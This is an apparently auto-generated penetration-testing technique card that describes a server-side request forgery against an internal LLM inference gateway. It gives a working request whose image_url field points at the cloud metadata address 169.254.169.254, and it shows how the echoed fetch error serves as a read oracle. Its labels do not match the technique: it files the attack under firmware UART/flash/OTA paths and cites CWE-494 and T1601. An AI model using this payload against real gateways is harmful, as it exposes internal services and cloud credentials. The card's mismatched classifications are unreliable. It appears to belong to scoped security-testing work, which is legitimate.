# The primitive — firmware / high-priv

- source canon: `holyshit-mode/vllm-gateway-internal-fleet-ssrf.md`
- base technique: `holyshit-mode-vllm-gateway-internal-fleet-ssrf-the-primitive.md`
- bindings: **MASTG-RES** · **CWE-494** · **ATT&CK T1601**
- context: **firmware** · auth **high-priv** · chain role **pivot**

## Route

- probes: `nmap-script-default`, `httpx`, `whatweb`, `webanalyze`
- chains: `recon`
- gate: every probe runs through the shared scope authority (rc=1 out of estate); the 3-gate differential turns output into a finding

## Context

- platform: the check lives in the image — uart/flash/ota paths, no-gain read-only dumps
- auth state: the baseline IS the privileged session; test downgrade paths (mass-assign, state-bypass)

## The technique

```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

## Probe adjustment (firmware × high-priv)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
